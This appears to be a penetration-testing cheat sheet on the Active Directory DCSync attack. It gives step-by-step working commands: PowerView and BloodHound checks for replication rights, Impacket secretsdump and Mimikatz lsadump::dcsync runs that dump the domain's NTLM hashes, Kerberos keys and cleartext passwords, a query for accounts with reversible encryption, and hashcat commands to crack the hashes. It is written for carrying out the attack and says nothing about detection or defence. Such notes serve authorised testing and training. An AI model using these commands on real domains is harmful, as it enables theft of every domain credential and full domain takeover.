# DS-Replication-Get-Changes and DS-Replication-Get-Changes-All (Extended Right) **DCSync attack**
**DCSync** is a technique for stealing the Active Directory password database by using the built-in Directory Replication Service Remote Protocol, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
- To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the **Replicating Directory Changes** and **Replicating Directory Changes All** permissions set).
- Domain/Enterprise Admins and default domain administrators have this right by default.
## Check user's Replication Rights
### Using PowerView
1. Identify the target user and verify their group memberships
```powershell
Get-DomainUser -Identity <user> | Select-Object samaccountname, objectsid, memberof, useraccountcontrol | Format-List
```
2. Verify Replication Rights
```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"  # Replace with the actual SID
Get-ObjectAcl "DC=yourdomain,DC=com" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
    Where-Object { $_.SecurityIdentifier -match $sid } |
    Select-Object AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
    Format-List
```
<img width="1443" height="115" alt="image" src="https://github.com/user-attachments/assets/be6df894-74e1-44c5-9e06-c1ed39261fc3" />

### Using BloodHound
These two permissions (GetChanges + GetChangesAll) allow a principal to perform a DCSync attack.
<img width="2314" height="523" alt="image" src="https://github.com/user-attachments/assets/ee425556-d0cd-4920-b600-e865d618f465" />

## DCSync Attack from Linux (Non-Domain Machine)

```shell
impacket-secretsdump -just-dc-user <username> <domain>/<admin_user>:<password>@<dc_ip>
```
Using Impacket Python 
```shell
secretsdump.py -outputfile domain_hashes -just-dc YOURDOMAIN/targetUser@targetIP
```

- **Parameters:**
    - `YOURDOMAIN`: Replace with your actual domain name.
    - `targetUser`: The username that has replication privileges.
    - `targetIP`: The IP address of the domain controller.
- **What It Does:** Initiates a replication request mimicking a DC. It writes out the NTLM hashes, Kerberos keys, and, if applicable, cleartext passwords to files prefixed with `domain_hashes`.

**After Running, List the Files:**

```bash
ls domain_hashes*
```

- **Expected Files:**
    - `domain_hashes.ntds` – Contains NTLM hashes.
    - `domain_hashes.ntds.kerberos` – Contains Kerberos keys.
    - `domain_hashes.ntds.cleartext` – Contains any cleartext credentials (if reversible encryption is enabled).

## Enumerate that user has the reversible encryption option
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
Using PowerView
```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
## DCSync Attack on Windows (Domain-Joined Machine)
1. Launch a Privileged PowerShell Session if we have the username and password that has DCSync rights
**Using runas.exe to open a session as the target user:**
```powershell
runas /netonly /user:YOURDOMAIN\User_With_Access_Rights powershell
```

2. Run Mimikatz in the Elevated Session
**Start Mimikatz:**
```powershell
.\mimikatz.exe
```
**Inside Mimikatz, run the DCSync command:**
```powershell
lsadump::dcsync /domain:YOURDOMAIN.LOCAL /user:YOURDOMAIN\administrator
```
- **What It Does:** Requests replication data for the `administrator` account (or another account of your choice) from the domain controller. Mimikatz will display information including the NTLM hash and other credential details.
**Command**: Dump the NTLM hash of a target user:
```powershell
lsadump::dcsync /user:<domain>\<username>
```
## Cracking NTLM hashes in case the reversible encryption option not checked for users
```shell
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
